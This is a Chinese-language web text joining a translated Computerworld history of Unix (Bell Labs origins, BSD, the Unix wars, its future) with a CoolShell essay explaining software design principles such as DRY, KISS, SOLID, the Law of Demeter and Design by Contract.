## Unix早期Thompson 和 Ritchie.当然，Unix的成功不是一蹴而就的。 在1971年，它首先被移植到了PDP-11微机（一个比PDP-7更强的微机）。文本格式和文本编译程序在这时被加入进了Unix。并且，当时的实验室专利部门已经开始用这些文本编译器，这也是Unix系统除开发团队之外的第一个用户。在1972年，Ritchie引入了一个更高级的语言–C语言（基于Thompson的B语言），此后，Thompson用C语言重写了Unix，这极大地增加了Unix的可移植跨平台性。然后，他们为这个操作系统命名Unics(Uniplexed Information and Computing Service)，这是和Multics玩的一个文字游戏。但最后，Unix成了最终的名字。（ **陈皓注** ：Unix下的经常出现缩写，如usr 是 user, ed是edit，gp是group，这也是Unix的文化。Unix的更名可能也是因为这个吧）是时候向全世界宣布这个系统系统了。Ritchie 和 Thompson于1974年7月在 _CACM_ 上发表了一篇论文– “The UNIX Time- Sharing System“《Unix分时操作系统》，这篇论文就像一个风暴一样席卷了都个IT界。直到有一天，Unix被限制在了只能由Bell实验室中的少数人使用。但是，因为有计算机协会的支持，当时的Unix处于一个引爆点。
” _CACM_ 的那篇论文产生了一个戏剧化的影响”， IT 历史学家 Peter Salus 在他的书《 _The Daemon, the Gnu and the Penguin_ 》中写到， “很快，Ken 被铺天盖地的Unix的请求所淹没”## 黑客的天堂Thompson 和 Ritchie 算得上是史上最名副其实的”黑客”，当时”黑客hacker”一词指的是那些把非同寻常的创意组合起来， 以一种超常智力，并以废寝忘食的态度解决了某个鲜为人知的软件问题的人。Thompson 和 Ritchie他们的所使用的开发方法，他们所写下的代码，极大地吸引了大学里的程序员，并在以后，这些大学中其中的一些程序员因为Unix开创了自己的公司，他们都是在Unix发展过程中的黑客，就像，加利福尼亚州大学的Bill Joy，卡内基梅隆大学的Rick Rashid ，以及Bell实验室David Korn。当然，他们开创的这些公司都没有IBM，HP和Microsoft的资助。“几乎从一开始，Unix就能够，也确实是开始了自我进化”，Thompson和Ritchie在 _CACM_ 论文中说到，”因为所有的源代码总可以容易被人在线地更改，所以，当有一个新的想法被发明，发现或是被建议出来的时候，大家都非常自愿地修订或重写Unix系统和上面的软件”。
Korn，一个今天还在AT&T工作的员工，上世纪70年代曾是Bell 实验室的一个程序员。”Unix的一个特点是，一个小工具刚被完成，就被另一个更好的工具所代替”，他回忆起来说，”如果你觉得不好的话，你完全可以开完一个更好的版本”。Korn当时为Unix开发了一个很具影响力的Korn shell，本质上来说，当年的Unix就像今天的开源软件。Salus，作为一个作家和技术历史家，回忆起，他上世纪70年代在多伦多大学时当教授时，在IBM System/360大机上使用APL编程语言工作时的情景–那并不很好用，但是自从1978年圣诞节以后，一个哥伦比亚大学的朋友给我演示了一下在微机上运行的Unix，”我说，’我的上帝啊’，我彻底被你征服了”。他说，Unix最关键的优势是他有一个”管道”特性（1973年引入），这么我们可以把上一个程序的输出轻松地传给下一个程序。”管道”的概念，由Bell实验室的McIlroy发明，随后”管道”这个东西被其它几乎所有的操作系统复制，包括所有的Unix， Linux，DOS和Windows。位于新泽西Murray Hill 的Bell 实验室总部_Credit: Alcatel-Lucent/Bell Labs_
Unix还有一个不错的地方。 “哇”，正如Salus所惊叹的，这个操作系统并不需要一个需要一百万美金的大型机才能运行的操作系统。它在极其原始的小型的DEC PDP-7微机上开发出来，因为这是当是Thompson 和 Ritchie可以找到用来写这个操作系统最好的机器（ **陈皓注：** 当时这个机器像垃圾一样被扔在实验室角落里）很多很多的大学研究者们使用Unix就是因为这是一个简单和容易修改的操作系统，而且对硬件资源要求的很少，代码也是开源和免费的。就像Sun Microsystems公司，或是一些用于特定的科学计算的主机公司，例如Multiflow Computer，他们在选择Unix作为操作系统时都和那些大学研究者们有相同的原因。## Unix家谱Unix成长为一个非私有的操作系统，是因为1956年的AT&T公司受命于联邦去经营电报电话服务。当然也可以开发软件，甚至那个软件可以有”合理”收费的许可证，但是这个公司却被禁止从事任何和计算机有并的商业活动。Unix，在开发的过程中，没有任何的奖励制度和管理，从一开始在AT&T公司出现时，其是一种近似于好奇或兴趣的东西。然而，20世纪70年代，AT&T公司开始意到Unix所带来的商业价值。公司的律师开始寻找一些手段来保护Unix，并让其成为一种商业机秘。从1979年Unix的版本V7开始，Unix的许可证开始禁止大学使用Unix的源码，包括在授课中学习。
没问题！一个荷兰阿姆斯特朗Vrije大学使用版本V6的计算机科学系的教授Andrew Tanenbaum说。在1987年，他为教学目的克隆了一个Unix，创建一个叫Minix的开源的操作系统，并可以在80286的Intel芯片上运行。“Minix使用了所有和Unix一样的想法，并且这是一个非常灿烂的事物”，Salus说，”只有一个专门是程序员的并且非常了解操作系统内部的人才成干出这件事来”。Minix从此变成了另一个起点–Linus Torvalids 在1991年使用Minix创造了Linux –这并不是一个简单的Unix克隆版本，只不过它长得像Unix。让我们再回到Linux出现的十年以前，Bill Joy，毕业于加利福尼亚州大学伯克利分校，当年，他在学校的时候拷贝了Bell 实验室的Unix版本，并且所到了这是一个很不错的可以使用Pascal编译器和文本编译器的操作系统平台。于是，他更改变扩展了Unix，形成了Unix的第二个最主要的分枝–BSD（Berkeley Software Distribution）Unix。在1978年3月，Joy卖出了第一个BSD的拷贝：50美金。到了1980年，有两个最主要的Unix的版本线，一个是Berkeley的BSD，另一个是AT&T的Unix，在这个时候，很显然，竞争最终引发了Unix的战争。在这场战争中，好的是，软件开发人员还是能够得到Unix的源码并对其按照自己的需要和兴致进行裁剪。而不好的是，Unix开始一发不可收拾地开发不停地出现各种各样的变种。
1982年，Joy创建了Sun Microsystems公司并提供了工作站–Sun-1，运行在当一个BSD的版本，叫SunOS（Solaris以之后的十年出现）。而AT&T则在随后的几年中发布了Unix System V的第一版，一个具有强大影响力的操作系统，最终造就了IBM的AIX和HP的HP-UX。Unix 家谱. _Credit: Eraserhead1 (cc-by- sa-3.0, GFDL)_   点击这里下载大图## Unix战争在上世纪80年代中期，大量的用户包括联邦政府，开始抱怨”Unix是一个理论上单一的可移植的操作系统”，但事实上应该如此却并不是这样。Unix软件供应商们，一方面为这些抱怨而为 其买单（”空头人情”），而另一方面，他们却在没日没夜地给用户们定制Unix的各种功能和APIs，旨在为了留下用户。而其它的Unix产商害怕At&T和Sun的联盟，所以，有各种各样的派别组织开始在”标准”上竞争，这些组织大多在X或Open命名，开放软件基金会（Open Software Foundation），Unix开放系统国际和公司（Unix International and Corporation for Open Systems）等等，在这些组织中形成的各种各样的争论，辩论，抗辩和观点可以写一本厚厚的书，但他们无一例外地以肆意相互评击来主张一个统一的Unix局面。
刚形成的开放软件基金会，其包括了IBM，HP，DEC和其它公司共同来反抗AT&T和Sun的联盟。在一个1988年未出版的文件中，DAPRA（Defense Advanced Research Projects Agency）一个著名的小型机先驱Gordon Bell说， “开放软件基金会OSF是一条’Unix穷人’进入正在发展的市场的一条路，他们以此来供养那个的高利润代码博物馆”。Unix战争在解决差异和设定一个操作系统标准中以失败告终。但在1993年，Unix社区听到了一个”警钟”–Microsoft发布了Windows NT，一个企业级的，32位的，支持多处理的操作系统。而Windows NT的所有者瞄准了Unix领域，并企图扩展Microsoft的桌面系统霸权到各种数据中心以及被Sun服务器所占领的地方。Microsoft的用户欢呼雀跃，Unix的产商开始惊慌。所有的主流的Unix竞争者们开始主动地联合起来形成了一个通用开放式软件环境（Common Open Software Environment），并在随后的几年中放下了他们的武器并开始着手把AT&T和Sun联盟为背景的”Unix International Group”并入开放软件基金会OSF。这个合并在今天叫做–The Open Group，而证明Unix系统和所有者的是Single Unix Specification，现在官方叫法是–“Unix”。
但在实践过程中，所有关于Unix的开发的确需要一个尽可能”标准化的”Unix，但是由于这些产商热衷于竞争的习惯，在Unix下并没有做到，但这一”标准化”被随后如潮水一样涌来的一个叫Linux的操作系统给完成了，这是一个开源的系统系统，则我们的Tanenbaum教授开发的Minix发展而来。### 什么是”Unix”?Unix，许多人会说，是一个几十年前在Bell实验室写的操作系统，Unix包括其所有的派生版本。今天，最主要的Unix版本是从两个主干上分出来的：一个当然是从AT&T出来的，另一个则是通过加利福尼亚伯克利分校产生的。今天，最顽强的分枝是IBM的AIX和HP的HP- UX以及Sun的Solaris。然而，只有”The Open Group”拥有Unix的注册商标，定义一个Unix需要遵从Single Unix Specification (SUS)。这包含了那些从来没有Unix思想的操作系统，比如Mac OS X Leopard（这是从BSD和Mach那边发展来）以及IBM的z/OS（这是从大型机操作系统MVS发展来的），因为它们遵从了SUS的API规范。基本上来说，只要那看起来像是一个Unix，那他就是一个Unix，而不管它是由什么代码写的。
当然，一个比较宽松的Unix定包含了Unix-Like的操作系统，有些时候，也叫做Unix-Clones或Look- Alikes，这些都是复制了Unix的东西但他们却并不直接使用Unix的代码。在这堆操作系统中，领头羊是Linux。最后，我们可以把Unix叫做一种”操作系统”因为这是已成了实际习惯。另外，对于一个操作系统的内核，Unix实现了很多典型的工具比如命令行编辑器，应用程序接口，开发环境，开发库和文档– _Gary Anthes_## Unix的未来由于这些长期竞争的各种版本的Unix缺乏可移值性，以及在价格方面没有优势，在x86芯片上占据主导地位的Linux和Windows将会快速地让所有的IT机构把Unix替换掉。调查机构Gartner Group最近公布了这项调查结果。“在主机服务器方面，调查结果继续显示公众对Linux的热情，而Windows也有相应的增长，而Unix系统还会长期存在，但是其逐渐地下滑”，这个调查报告由2009年2月发布。“Unix还会像以前那样长期存在，但它已不如从前，而这种局面只会愈演愈烈” Gartner分析师George Weiss说，”Linux将会是Unix的另一选择”，虽然Linux并没有像Unix那样经过了这么长的开发、性能调整和压力测试的过程，但很明显他很快就要达到像Unix那样的性能，可靠和扩展性”。
但是，最近一个由Computerworld发起一个民意调查，暗示了所有一切把Unix踢开的举动不会很快地发生。在一个由130个Unix用户和211个IT经理的问卷调查中显示，其90%的人说他们的公司”非常极端地信任Unix”。不到半数的被访者说，”Unix是一个非常基本的平台，但我们并不确定其未来是否会被保留”，而只有12%的受访者说，”我们期望在未来把Unix迁走”。节省成本，是诸多原因中最主要是一个原因。Weiss说，移值到x86处理器上会越来越快，因为这些硬件的价值实在是太便宜了。”水平扩展架构，集群技术，云计算，虚拟化技术，你只需要把这些技术合并一下，通过这些技术应用的趋势，我们可以看到操作系统的选择基本上就是Linux和Windows”，他说。“例如”，Weiss说，”在最近Cisco宣布的Unified Computing 架构，你可以拥有网络，存储，计算，内存，光纤连接，但你不需要Unix。你可以安装Linux或Windows并使用x86平台。所以Intel赢得了Linux取代Unix的那半壁江山”。The Open Group，目前Single Unix Specification和Unix系统认证的所有者，开始有点退步并有点承认Linux也是一个Unix系统的选择，因为Unix是”高端性能，可扩展性和性能可以用于很多相当重要的应用”，而Linux则是一个更为小的，注重于并不太注重的应用。
AT&T的Korn是其中一个对Unix仍然看到的人。Korn说，Unix的长处是它的历史，自从1973年来引入”管道”技术，它就可以被分成几个部分来部署。这会把Unix带向前方，他说，”这个哲学体系可以运用在云计算中，在那里，你只需要创建一些小的可重用的碎片而不是一个巨大的应用”。## Unix传奇无论最后的Unix命运会怎么样，这个从Bell实验室出生的40岁的家伙，已经书写了一段传奇，而且这个传奇可能还会继续几十年。它影响并产生了一个相当相当长的流行软件列表，包括给IBM，HP和Sun提供的Unix，以及Apple的Mac OS X和Linux。它同样影响了Microsoft的Windows NT以及IBM和Microsoft弄出来的DOS。## 请你来说### 分享你的Unix记忆！因为Unix，产生了许多公司，并走向了成功，因为当时Unix给了一个低成本的平台。在Internet上的服务器，Unix是核心的建筑区，今天它也是所有通讯系统的心脏。由它孕育了许多架构上的创意，比如管道，并且，Unix引出的Mach为科学作出了巨大的贡献，同时也为多处理器计算作出了贡献。ACM在1983年因为Unix授予Thompson和Ritchie图灵奖时说过：”Unix系统最天才的部分是它的framework，它激发了程序员们沿着这一方向工作”。
**作者** ：Gary Anthes   **时间** ：2009年6月4日美国东部时间凌晨12:01**译者** ：陈皓（haoel(at)hotmail.com）   **时间** ：2009年6月11日北京时间晚上10:22******关于更为详细的历史，可以参考我的《Unix** **传奇》上篇** **，下篇****以及一篇CSDN** **对我的采访《Unix的现状与未来** **》****（本文由陈皓翻译，在转载时请注明作者和出处）**# 一些软件设计的原则作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前本站向大家介绍过一些软件开发的原则，比如优质代码的十诫和Unix传奇(下篇)")中所以说的UNIX的设计原则。相信大家从中能够从中学了解到一些设计原理方面的知识，正如我在《再谈“我是怎么招聘程序”》中所说的，一个好的程序员通常由其操作技能、知识水平，经验层力和能力四个方面组成。在这里想和大家说说设计中的一些原则，我认为这些东西属于长期经验总结出来的知识。这些原则，每一个程序员都应该了解。但是请不要教条主义，在使用的时候还是要多多考虑实际情况。其实， **下面这些原则，不单单只是软件开发，可以推广到其它生产活动中，甚至我们的生活中** 。
目录* Don’t Repeat Yourself (DRY)   * Keep It Simple, Stupid (KISS)   * Program to an interface, not an implementation   * Command-Query Separation (CQS) – 命令-查询分离原则   * You Ain’t Gonna Need It (YAGNI)   * Law of Demeter – 迪米特法则   * 面向对象的S.O.L.I.D 原则   * Common Closure Principle（CCP）– 共同封闭原则   * Common Reuse Principle (CRP) – 共同重用原则   * Hollywood Principle – 好莱坞原则   * High Cohesion & Low/Loose coupling & – 高内聚， 低耦合   * Convention over Configuration（CoC）– 惯例优于配置原则   * Separation of Concerns (SoC) – 关注点分离   * Design by Contract (DbC) – 契约式设计   * Acyclic Dependencies Principle (ADP) – 无环依赖原则   * 后记
#### Don’t Repeat Yourself (DRY)DRY 是一个最简单的法则，也是最容易被理解的。但它也可能是最难被应用的（因为要做到这样，我们需要在泛型设计上做相当的努力，这并不是一件容易的事）。它意味着，当我们在两个或多个地方的时候发现一些相似的代码的时候，我们需要把他们的共性抽象出来形一个唯一的新方法，并且改变现有的地方的代码让他们以一些合适的参数调用这个新的方法。**参考** ：http://en.wikipedia.org/wiki/Don%27t_repeat_yourself#### Keep It Simple, Stupid (KISS)KISS原则在设计上可能最被推崇的，在家装设计，界面设计 ，操作设计上，复杂的东西越来越被众人所BS了，而简单的东西越来越被人所认可，比如这些UI的设计和我们中国网页（尤其是新浪的网页）者是负面的例子。“宜家”（IKEA）简约、效率的家居设计、生产思路；“微软”（Microsoft）“所见即所得”的理念；“谷歌”（Google)简约、直接的商业风格，无一例外的遵循了“kiss”原则，也正是“kiss”原则，成就了这些看似神奇的商业经典。而苹果公司的iPhone/iPad将这个原则实践到了极至。
把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。**参考** ：http://en.wikipedia.org/wiki/KISS_principle#### Program to an interface, not an implementation这是设计模式中最根本的哲学，注重接口，而不是实现，依赖接口，而不是实现。接口是抽象是稳定的，实现则是多种多样的。以后面我们会面向对象的SOLID原则中会提到我们的依赖倒置原则，就是这个原则的的另一种样子。还有一条原则叫 **Composition over inheritance** （喜欢组合而不是继承），这两条是那23个经典设计模式中的设计原则。#### Command-Query Separation (CQS) – 命令-查询分离原则* 查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质；   * 命令：当一个方法要改变对象的状态的时候，它就具有命令的性质；通常，一个方法可能是纯的Command模式或者是纯的Query模式，或者是两者的混合体。在设计接口时，如果可能，应该尽量使接口单一化，保证方法的行为严格的是命令或者是查询，这样查询方法不会改变对象的状态，没有副作用，而会改变对象的状态的方法不可能有返回值。也就是说：如果我们要问一个问题，那么就不应该影响到它的答案。实际应用，要视具体情况而定，语义的清晰性和使用的简单性之间需要权衡。将Command和Query功能合并入一个方法，方便了客户的使用，但是，降低了清晰性，而且，可能不便于基于断言的程序设计并且需要一个变量来保存查询结果。
在系统设计中，很多系统也是以这样原则设计的，查询的功能和命令功能的系统分离，这样有则于系统性能，也有利于系统的安全性。**参考** ：http://en.wikipedia.org/wiki/Command- query_separation#### You Ain’t Gonna Need It (YAGNI)这个原则简而言之为——只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。* 如无必要，勿增复杂性。   * 软件开发先是一场沟通博弈。以前本站有一篇关于过度重构的文章，这个示例就是这个原则的反例。而，WebSphere的设计者就表示过他过度设计了这个产品。我们的程序员或是架构师在设计系统的时候，会考虑很多扩展性的东西，导致在架构与设计方面使用了大量折衷，最后导致项目失败。这是个令人感到讽刺的教训，因为本来希望尽可能延长项目的生命周期，结果反而缩短了生命周期。**参考** ：http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It#### Law of Demeter – 迪米特法则
迪米特法则(Law of Demeter)，又称“最少知识原则”（Principle of Least Knowledge），其来源于1987年荷兰大学的一个叫做Demeter的项目。Craig Larman把Law of Demeter又称作“不要和陌生人说话”。在《程序员修炼之道》中讲LoD的那一章叫作“解耦合与迪米特法则”。关于迪米特法则有一些很形象的比喻：* 如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？   * 如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？和狗的四肢说话？让店员自己从钱包里拿钱？这听起来有点荒唐，不过在我们的代码里这几乎是见怪不怪的事情了。对于LoD，正式的表述如下：> 对于对象 ‘O’ 中一个方法’M’，M应该只能够访问以下对象中的方法： > >   1. 对象O； >   2. 与O直接相关的Component Object； >   3. 由方法M创建或者实例化的对象； >   4. 作为方法M的参数的对象。 >在《Clean Code》一书中，有一段Apache framework中的一段违反了LoD的代码：final String outputDir = ctxt.getOptions().getScratchDir().getAbsolutePath();
这么长的一串对其它对象的细节，以及细节的细节，细节的细节的细节……的调用，增加了耦合，使得代码结构复杂、僵化，难以扩展和维护。在《重构》一书中的代码的环味道中有一种叫做“Feature Envy”(依恋情结），形象的描述了一种违反了LoC的情况。Feature Envy就是说一个对象对其它对象的内容更有兴趣，也就是说老是羡慕别的对象的成员、结构或者功能，大老远的调用人家的东西。这样的结构显然是不合理的。我们的程序应该写得比较“害羞”。不能像前面例子中的那个不把自己当外人的店员一样，拿过客人的钱包自己把钱拿出来。“害羞”的程序只和自己最近的朋友交谈。这种情况下应该调整程序的结构，让那个对象自己拥有它羡慕的feature，或者使用合理的设计模式（例如Facade和Mediator）。**参考** ：http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge#### 面向对象的S.O.L.I.D 原则一般来说这是面向对象的五大设计原则，但是，我觉得这些原则可适用于所有的软件开发。**Single Responsibility Principle (SRP) – 职责单一原则**
关于单一职责原则，其核心的思想是： **一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因** 。单一职责原则可以看作是低耦合、高内聚在面向对象原则上的引申，将职责定义为引起变化的原因，以提高内聚性来减少引起变化的原因。职责过多，可能引起它变化的原因就越多，这将导致职责依赖，相互之间就产生影响，从而极大的损伤其内聚性和耦合度。单一职责，通常意味着单一的功能，因此不要为一个模块实现过多的功能点，以保证实体只有一个引起它变化的原因。* Unix/Linux是这一原则的完美体现者。各个程序都独立负责一个单一的事。   * Windows是这一原则的反面示例。几乎所有的程序都交织耦合在一起。**Open/Closed Principle (OCP) – 开闭原则**关于开发封闭原则，其核心的思想是：模块是可扩展的，而不可修改的。也就是说， **对扩展是开放的，而对修改是封闭的** 。* 对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。   * 对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。对于面向对象来说，需要你依赖抽象，而不是实现，23个经典设计模式中的“策略模式”就是这个实现。对于非面向对象编程，一些API需要你传入一个你可以扩展的函数，比如我们的C 语言的qsort()允许你提供一个“比较器”，STL中的容器类的内存分配，ACE中的多线程的各种锁。对于软件方面，浏览器的各种插件属于这个原则的实践。
**Liskov substitution principle (LSP) – 里氏代换原则**软件工程大师Robert C. Martin把里氏代换原则最终简化为一句话：“Subtypes must be substitutable for their base types”。也就是，子类必须能够替换成它们的基类。即：子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。另外，不应该在代码中出现if/else之类对子类类型进行判断的条件。里氏替换原则LSP是使代码符合开闭原则的一个重要保证。正是由于子类型的可替换性才使得父类型的模块在无需修改的情况下就可以扩展。这么说来，似乎有点教条化，我非常建议大家看看这个原则个两个最经典的案例——“正方形不是长方形”和“鸵鸟不是鸟”。通过这两个案例，你会明白《墨子 小取》中说的 ——“娣，美人也，爱娣，非爱美人也….盗，人也；恶盗，非恶人也。”——妹妹虽然是美人，但喜欢妹妹并不代表喜欢美人。盗贼是人，但讨厌盗贼也并不代表就讨厌人类。 **这个原则让你考虑的不是语义上对象的间的关系，而是实际需求的环境** 。在很多情况下，在设计初期我们类之间的关系不是很明确，LSP则给了我们一个判断和设计类之间关系的基准：需不需要继承，以及怎样设计继承关系。
**Interface Segregation Principle (ISP) – 接口隔离原则**接口隔离原则意思是把功能实现在接口中，而不是类中，使用多个专门的接口比使用单一的总接口要好。举个例子，我们对电脑有不同的使用方式，比如：写作，通讯，看电影，打游戏，上网，编程，计算，数据等，如果我们把这些功能都声明在电脑的抽类里面，那么，我们的上网本，PC机，服务器，笔记本的实现类都要实现所有的这些接口，这就显得太复杂了。所以，我们可以把其这些功能接口隔离开来，比如：工作学习接口，编程开发接口，上网娱乐接口，计算和数据服务接口，这样，我们的不同功能的电脑就可以有所选择地继承这些接口。这个原则可以提升我们“搭积木式”的软件开发。对于设计来说，Java中的各种Event Listener和Adapter，对于软件开发来说，不同的用户权限有不同的功能，不同的版本有不同的功能，都是这个原则的应用。**Dependency Inversion Principle (DIP) – 依赖倒置原则**高层模块不应该依赖于低层模块的实现，而是依赖于高层抽象。举个例子，墙面的开关不应该依赖于电灯的开关实现，而是应该依赖于一个抽象的开关的标准接口，这样，当我们扩展程序的时候，我们的开关同样可以控制其它不同的灯，甚至不同的电器。也就是说，电灯和其它电器继承并实现我们的标准开关接口，而我们的开关产商就可不需要关于其要控制什么样的设备，只需要关心那个标准的开关标准。这就是依赖倒置原则。
这就好像浏览器并不依赖于后面的web服务器，其只依赖于HTTP协议。这个原则实在是太重要了，社会的分工化，标准化都是这个设计原则的体现。**参考** ：http://en.wikipedia.org/wiki/Solid_(object- oriented_design))#### Common Closure Principle（CCP）– 共同封闭原则一个包中所有的类应该对同一种类型的变化关闭。一个变化影响一个包，便影响了包中所有的类。一个更简短的说法是：一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。CCP原则就是把因为某个同样的原因而需要修改的所有类组合进一个包里。如果2个类从物理上或者从概念上联系得非常紧密，它们通常一起发生改变，那么它们应该属于同一个包。CCP延伸了开闭原则（OCP）的“关闭”概念，当因为某个原因需要修改时，把需要修改的范围限制在一个最小范围内的包里。**参考** ：#### Common Reuse Principle (CRP) – 共同重用原则包的所有类被一起重用。如果你重用了其中的一个类，就重用全部。换个说法是，没有被一起重用的类不应该被组合在一起。CRP原则帮助我们决定哪些类应该被放到同一个包里。依赖一个包就是依赖这个包所包含的一切。当一个包发生了改变，并发布新的版本，使用这个包的所有用户都必须在新的包环境下验证他们的工作，即使被他们使用的部分没有发生任何改变。因为如果包中包含有未被使用的类，即使用户不关心该类是否改变，但用户还是不得不升级该包并对原来的功能加以重新测试。
CCP则让系统的维护者受益。CCP让包尽可能大（CCP原则加入功能相关的类），CRP则让包尽可能小（CRP原则剔除不使用的类）。它们的出发点不一样，但不相互冲突。**参考** ：#### Hollywood Principle – 好莱坞原则好莱坞原则就是一句话——“don’t call us, we’ll call you.”。意思是，好莱坞的经纪人们不希望你去联系他们，而是他们会在需要的时候来联系你。也就是说，所有的组件都是被动的，所有的组件初始化和调用都由容器负责。组件处在一个容器当中，由容器负责管理。简单的来讲，就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。这也就是所谓“控制反转”的概念所在：1. 不创建对象，而是描述创建对象的方式。   2. 在代码中，对象与服务没有直接联系，而是容器负责将这些联系在一起。控制权由应用代码中转到了外部容器，控制权的转移，是所谓反转。好莱坞原则就是IoC（Inversion of Control）或DI（Dependency Injection ）的基础原则。这个原则很像依赖倒置原则，依赖接口，而不是实例，但是这个原则要解决的是怎么把这个实例传入调用类中？你可能把其声明成成员，你可以通过构造函数，你可以通过函数参数。但是 IoC可以让你通过配置文件，一个由Service Container 读取的配置文件来产生实际配置的类。但是程序也有可能变得不易读了，程序的性能也有可能还会下降。
**参考** ：* http://en.wikipedia.org/wiki/Hollywood_Principle   * http://en.wikipedia.org/wiki/Inversion_of_Control#### High Cohesion & Low/Loose coupling & – 高内聚， 低耦合这个原则是UNIX操作系统设计的经典原则，把模块间的耦合降到最低，而努力让一个模块做到精益求精。* 内聚：一个模块内各个元素彼此结合的紧密程度   * 耦合：一个软件结构内不同模块之间互连程度的度量内聚意味着重用和独立，耦合意味着多米诺效应牵一发动全身。**参考** ：* http://en.wikipedia.org/wiki/Coupling_(computer_science)")   * http://en.wikipedia.org/wiki/Cohesion_(computer_science)")#### Convention over Configuration（CoC）– 惯例优于配置原则简单点说，就是将一些公认的配置方式和信息作为内部缺省的规则来使用。例如，Hibernate的映射文件，如果约定字段名和类属性一致的话，基本上就可以不要这个配置文件了。你的应用只需要指定不convention的信息即可，从而减少了大量convention而又不得不花时间和精力啰里啰嗦的东东。配置文件很多时候相当的影响开发效率。
Rails 中很少有配置文件（但不是没有，数据库连接就是一个配置文件），Rails 的fans号称期开发效率是 java 开发的 10 倍，估计就是这个原因。Maven也使用了CoC原则，当你执行mvn -compile命令的时候，不需要指源文件放在什么地方，而编译以后的class文件放置在什么地方也没有指定，这就是CoC原则。**参考** ：http://en.wikipedia.org/wiki/Convention_over_Configuration#### Separation of Concerns (SoC) – 关注点分离SoC 是计算机科学中最重要的努力目标之一。这个原则，就是在软件开发中，通过各种手段，将问题的各个关注点分开。如果一个问题能分解为独立且较小的问题，就是相对较易解决的。问题太过于复杂，要解决问题需要关注的点太多，而程序员的能力是有限的，不能同时关注于问题的各个方面。正如程序员的记忆力相对于计算机知识来说那么有限一样，程序员解决问题的能力相对于要解决的问题的复杂性也是一样的非常有限。在我们分析问题的时候，如果我们把所有的东西混在一起讨论，那么就只会有一个结果——乱。
我记得在上一家公司有一个项目，讨论就讨论了1年多，项目本来不复杂，但是没有使用SoC，全部的东西混为一谈，再加上一堆程序员注入了各种不同的观点和想法，整个项目一下子就失控了。最后，本来一个1年的项目做了3年。实现关注点分离的方法主要有两种，一种是标准化，另一种是抽象与包装。标准化就是制定一套标准，让使用者都遵守它，将人们的行为统一起来，这样使用标准的人就不用担心别人会有很多种不同的实现，使自己的程序不能和别人的配合。Java EE就是一个标准的大集合。每个开发者只需要关注于标准本身和他所在做的事情就行了。就像是开发镙丝钉的人只专注于开发镙丝钉就行了，而不用关注镙帽是怎么生产的，反正镙帽和镙丝钉按标来就一定能合得上。不断地把程序的某些部分抽像差包装起来，也是实现关注点分离的好方法。一旦一个函数被抽像出来并实现了，那么使用函数的人就不用关心这个函数是如何实现的，同样的，一旦一个类被抽像并实现了，类的使用者也不用再关注于这个类的内部是如何实现的。诸如组件，分层，面向服务，等等这些概念都是在不同的层次上做抽像和包装，以使得使用者不用关心它的内部实现细节。说白了还是“高内聚，低耦合”。**参考** ：
#### Design by Contract (DbC) – 契约式设计DbC的核心思想是对软件系统中的元素之间相互合作以及“责任”与“义务”的比喻。这种比喻从商业活动中“客户”与“供应商”达成“契约”而得来。例如：* 供应商必须提供某种产品（责任），并且他有权期望客户已经付款（权利）。   * 客户必须付款（责任），并且有权得到产品（权利）。   * 契约双方必须履行那些对所有契约都有效的责任，如法律和规定等。同样的，如果在程序设计中一个模块提供了某种功能，那么它要：* 期望所有调用它的客户模块都保证一定的进入条件：这就是模块的先验条件（客户的义务和供应商的权利，这样它就不用去处理不满足先验条件的情况）。   * 保证退出时给出特定的属性：这就是模块的后验条件——（供应商的义务，显然也是客户的权利）。   * 在进入时假定，并在退出时保持一些特定的属性：不变式。契约就是这些权利和义务的正式形式。我们可以用“三个问题”来总结DbC，并且作为设计者要经常问：* 它期望的是什么？   * 它要保证的是什么？   * 它要保持的是什么？根据Bertrand Meyer氏提出的DBC概念的描述，对于类的一个方法，都有一个前提条件以及一个后续条件，前提条件说明方法接受什么样的参数数据等，只有前提条件得到满足时，这个方法才能被调用；同时后续条件用来说明这个方法完成时的状态，如果一个方法的执行会导致这个方法的后续条件不成立，那么这个方法也不应该正常返回。
现在把前提条件以及后续条件应用到继承子类中，子类方法应该满足：1. 前提条件不强于基类．   2. 后续条件不弱于基类．换句话说，通过基类的接口调用一个对象时，用户只知道基类前提条件以及后续条件。因此继承类不得要求用户提供比基类方法要求的更强的前提条件，亦即，继承类方法必须接受任何基类方法能接受的任何条件（参数）。同样，继承类必须顺从基类的所有后续条件，亦即，继承类方法的行为和输出不得违反由基类建立起来的任何约束，不能让用户对继承类方法的输出感到困惑。这样，我们就有了基于契约的LSP，基于契约的LSP是LSP的一种强化。**参考** ：http://en.wikipedia.org/wiki/Design_by_contract#### Acyclic Dependencies Principle (ADP) – 无环依赖原则包之间的依赖结构必须是一个直接的无环图形，也就是说，在依赖结构中不允许出现环（循环依赖）。如果包的依赖形成了环状结构，怎么样打破这种循环依赖呢？有2种方法可以打破这种循环依赖关系：第一种方法是创建新的包，如果A、B、C形成环路依赖，那么把这些共同类抽出来放在一个新的包D里。这样就把C依赖A变成了C依赖D以及A依赖D，从而打破了循环依赖关系。第二种方法是使用DIP（依赖倒置原则）和ISP（接口分隔原则）设计原则。
